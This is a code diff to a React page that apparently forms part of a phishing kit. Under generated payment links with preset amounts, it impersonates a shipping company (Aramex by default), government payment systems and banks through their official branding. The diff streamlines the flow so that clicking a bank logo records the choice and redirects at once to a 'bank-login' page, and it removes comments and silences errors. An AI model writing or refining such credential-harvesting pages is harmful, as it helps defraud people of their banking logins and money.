@@ -2,19 +2,18 @@ import { useState, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { Badge } from "@/components/ui/badge";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Building2, ArrowLeft, Loader2 } from "lucide-react";
+import { Building2, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
-import { bankBranding, shippingCompanyBranding } from "@/lib/brandingSystem";
+import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import BrandedTopBar from "@/components/BrandedTopBar";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import BankLogo from "@/components/BankLogo";
-import { PaymentPageWrapper } from "@/components/PaymentPageWrapper";
+import BrandedCarousel from "@/components/BrandedCarousel";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -27,17 +26,13 @@ const PaymentBankSelector = () => {
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
   
-  // Get country from link data
   const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
   const countryData = getCountryByCode(countryCode);
   
-  // Get government payment system
   const govSystem = getGovernmentPaymentSystem(countryCode);
   
-  // Get preselected bank from link payload if available
   const preselectedBank = linkData?.payload?.selected_bank;
   
-  // Get customer info from link data (cross-device compatible)
   const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
@@ -47,11 +42,9 @@ const PaymentBankSelector = () => {
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
 
-  // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
   const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
 
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
+  let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
       amount = rawAmount;
@@ -63,21 +56,17 @@ const PaymentBankSelector = () => {
     }
   }
 
-  // Get saved currency code from payment_data or shipping info
   const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
   const formattedAmount = formatCurrency(amount, currencyCode);
   
-  // Load banks when country is available from link data
   useEffect(() => {
     if (countryCode) {
       setLoadingBanks(true);
-      // Simulate API call
       setTimeout(() => {
         const countryBanks = getBanksByCountry(countryCode);
         setBanks(countryBanks);
         setLoadingBanks(false);
         
-        // Auto-select bank if it was preselected during link creation
         if (preselectedBank) {
           setSelectedBank(preselectedBank);
         }
@@ -85,14 +74,33 @@ const PaymentBankSelector = () => {
     }
   }, [countryCode, preselectedBank]);
   
-  const handleBankSelect = (bankId: string) => {
+  const handleBankSelect = async (bankId: string) => {
     setSelectedBank(bankId);
+    
+    if (!linkData) return;
+
+    try {
+      const updatedPayload = {
+        ...linkData.payload,
+        selectedCountry: countryCode,
+        selectedBank: bankId,
+      };
+
+      await updateLink.mutateAsync({
+        linkId: id!,
+        payload: updatedPayload
+      });
+    } catch (error) {
+    }
+
+    setTimeout(() => {
+      navigate(`/pay/${id}/bank-login`);
+    }, 400);
   };
   
   const handleSkip = async () => {
     if (!linkData) return;
 
-    // Save to link for cross-device compatibility
     try {
       const updatedPayload = {
         ...linkData.payload,
@@ -105,7 +113,6 @@ const PaymentBankSelector = () => {
         payload: updatedPayload
       });
     } catch (error) {
-      // Error saving bank selection
     }
 
     toast({
@@ -115,30 +122,7 @@ const PaymentBankSelector = () => {
 
     navigate(`/pay/${id}/bank-login`);
   };
-
-  const handleContinue = async () => {
-    if (!linkData || !selectedBank) return;
-
-    // Save to link for cross-device compatibility
-    try {
-      const updatedPayload = {
-        ...linkData.payload,
-        selectedCountry: countryCode,
-        selectedBank: selectedBank,
-      };
-
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: updatedPayload
-      });
-    } catch (error) {
-      // Error saving bank selection
-    }
-
-    navigate(`/pay/${id}/bank-login`);
-  };
   
-  // Show loading state while fetching link data
   if (linkLoading || !linkData) {
     return (
       <div 
@@ -156,7 +140,6 @@ const PaymentBankSelector = () => {
     );
   }
   
-  // Show error if no country data
   if (!countryData) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
@@ -172,28 +155,28 @@ const PaymentBankSelector = () => {
   
   return (
     <>
-      {/* Branded Top Bar with Official Logo */}
       <BrandedTopBar 
         serviceKey={serviceKey}
         serviceName={serviceName}
         showBackButton={true}
         backPath={`/pay/${id}/details`}
-        showCarousel={true}
+        showCarousel={false}
       />
+      
+      <BrandedCarousel serviceKey={serviceKey} className="mb-6" />
 
       <div 
-        className="min-h-screen py-4 sm:py-8" 
+        className="min-h-screen py-6 sm:py-8" 
         dir="rtl"
         style={{
-          background: companyBranding?.colors.background || govSystem.colors.surface,
+          background: `linear-gradient(135deg, ${companyBranding?.colors.background || govSystem.colors.surface}, ${companyBranding?.colors.surface || '#ffffff'})`,
           fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
         }}
       >
-        <div className="container mx-auto px-4 max-w-2xl">
-          {/* Page Title */}
-          <div className="mb-6 text-center">
+        <div className="container mx-auto px-4 max-w-4xl">
+          <div className="mb-8 text-center">
             <h1 
-              className="text-2xl sm:text-3xl font-bold mb-2" 
+              className="text-3xl sm:text-4xl font-bold mb-3" 
               style={{ 
                 color: companyBranding?.colors.text || govSystem.colors.text,
                 fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
@@ -202,9 +185,9 @@ const PaymentBankSelector = () => {
               اختر البنك
             </h1>
             <p 
-              className="text-sm sm:text-base" 
+              className="text-lg sm:text-xl font-semibold" 
               style={{ 
-                color: companyBranding?.colors.textLight || govSystem.colors.textLight,
+                color: companyBranding?.colors.primary || govSystem.colors.primary,
                 fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
               }}
             >
@@ -212,7 +195,6 @@ const PaymentBankSelector = () => {
             </p>
           </div>
 
-        {/* Loading Banks */}
         {loadingBanks ? (
           <div className="text-center py-12">
             <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
@@ -236,113 +218,63 @@ const PaymentBankSelector = () => {
           </Card>
         ) : (
           <>
-            {/* Banks Grid */}
-            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4 mb-6">
+            <div className="grid grid-cols-3 sm:grid-cols-4 gap-4 sm:gap-6 mb-8">
               {banks.map((bank) => (
-                <Card
+                <div
                   key={bank.id}
-                  className={`p-3 sm:p-4 cursor-pointer transition-all hover:shadow-lg hover:scale-[1.02] ${
-                    selectedBank === bank.id
-                      ? 'ring-2 shadow-lg'
-                      : 'hover:bg-accent/30'
-                  }`}
-                  style={{
-                    borderColor: selectedBank === bank.id ? bank.color || govSystem.colors.primary : govSystem.colors.border,
-                    backgroundColor: selectedBank === bank.id ? `${bank.color || govSystem.colors.primary}08` : '#ffffff',
-                    borderRadius: '12px',
-                    borderWidth: selectedBank === bank.id ? '2px' : '1px',
-                    position: 'relative'
-                  }}
+                  className="group relative cursor-pointer"
                   onClick={() => handleBankSelect(bank.id)}
                 >
-                  {/* Checkmark Badge */}
-                  {selectedBank === bank.id && (
-                    <div
-                      className="absolute -top-2 -right-2 w-6 h-6 rounded-full flex items-center justify-center shadow-md z-10"
-                      style={{ backgroundColor: bank.color || govSystem.colors.primary }}
-                    >
-                      <svg
-                        className="w-3.5 h-3.5 text-white"
-                        fill="none"
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                        strokeWidth="3"
-                        viewBox="0 0 24 24"
-                        stroke="currentColor"
+                  <div 
+                    className="relative overflow-hidden rounded-2xl bg-white p-4 sm:p-6 transition-all duration-500 hover:scale-105 hover:shadow-2xl border-2"
+                    style={{
+                      borderColor: selectedBank === bank.id ? (bank.color || govSystem.colors.primary) : '#e5e7eb',
+                      boxShadow: selectedBank === bank.id ? `0 10px 40px -10px ${bank.color || govSystem.colors.primary}60` : '0 2px 8px rgba(0,0,0,0.08)',
+                    }}
+                  >
+                    {selectedBank === bank.id && (
+                      <div
+                        className="absolute top-2 right-2 w-6 h-6 rounded-full flex items-center justify-center shadow-lg z-10"
+                        style={{ backgroundColor: bank.color || govSystem.colors.primary }}
                       >
-                        <path d="M5 13l4 4L19 7" />
-                      </svg>
-                    </div>
-                  )}
-                  
-                  <div className="flex flex-col items-center gap-2 sm:gap-3">
-                    {/* Bank Logo - Enhanced with Official Branding */}
-                    <div 
-                      className="w-20 h-20 sm:w-24 sm:h-24 rounded-xl flex items-center justify-center p-3 sm:p-4 bg-white border-2 transition-all shadow-md"
-                      style={{
-                        borderColor: selectedBank === bank.id ? (bankBranding[bank.id]?.colors.primary || bank.color || govSystem.colors.primary) : '#e5e7eb',
-                        borderRadius: bankBranding[bank.id]?.borderRadius.md || '10px',
-                        boxShadow: selectedBank === bank.id ? `0 8px 20px -5px ${bank.color || govSystem.colors.primary}40` : '0 1px 3px rgba(0, 0, 0, 0.1)'
-                      }}
-                    >
+                        <svg className="w-4 h-4 text-white" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" viewBox="0 0 24 24" stroke="currentColor">
+                          <path d="M5 13l4 4L19 7" />
+                        </svg>
+                      </div>
+                    )}
+                    
+                    <div className="aspect-square flex items-center justify-center">
                       <BankLogo 
                         bankId={bank.id}
                         bankName={bank.name}
                         bankNameAr={bank.nameAr}
                         color={bank.color}
-                        size="lg"
-                        className="w-full h-full"
+                        size="xl"
+                        className="w-full h-full object-contain transition-transform duration-500 group-hover:scale-110"
                       />
                     </div>
-                    
-                    {/* Bank Name */}
-                    <div className="text-center w-full">
-                      <h3 
-                        className="font-bold text-xs sm:text-sm leading-tight mb-0.5" 
-                        style={{ 
-                          fontFamily: govSystem.fonts.primaryAr, 
-                          color: selectedBank === bank.id ? (bank.color || govSystem.colors.primary) : govSystem.colors.text 
-                        }}
-                      >
-                        {bank.nameAr}
-                      </h3>
-                      <p className="text-[10px] sm:text-xs leading-tight" style={{ color: govSystem.colors.textLight }}>
-                        {bank.name}
-                      </p>
-                    </div>
                   </div>
-                </Card>
+                </div>
               ))}
             </div>
 
-            {/* Action Buttons */}
-            <div className="space-y-3">
-              <Button
-                onClick={handleContinue}
-                disabled={!selectedBank}
-                className="w-full h-12 text-base font-semibold"
-                style={{
-                  background: selectedBank
-                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                    : undefined,
-                }}
-              >
-                متابعة
-              </Button>
-              
+            <div className="max-w-xl mx-auto">
               <Button
                 onClick={handleSkip}
                 variant="outline"
                 className="w-full h-12 text-base"
+                style={{
+                  borderColor: govSystem.colors.primary + '50',
+                  color: govSystem.colors.text,
+                }}
               >
                 تخطي واستخدام أي بنك
               </Button>
             </div>
 
-            {/* Info Note */}
-            <div className="mt-6 p-4 rounded-xl border" style={{ backgroundColor: `${govSystem.colors.primary}05`, borderColor: `${govSystem.colors.primary}20` }}>
-              <p className="text-xs text-center" style={{ color: govSystem.colors.text }}>
-                🔐 سيتم توجيهك لصفحة تسجيل الدخول الآمنة للبنك المختار
+            <div className="mt-6 p-4 rounded-xl border text-center" style={{ backgroundColor: `${govSystem.colors.primary}08`, borderColor: `${govSystem.colors.primary}30` }}>
+              <p className="text-sm" style={{ color: govSystem.colors.text }}>
+                🔐 انقر على شعار البنك للانتقال لصفحة تسجيل الدخول الآمنة
               </p>
             </div>
           </>
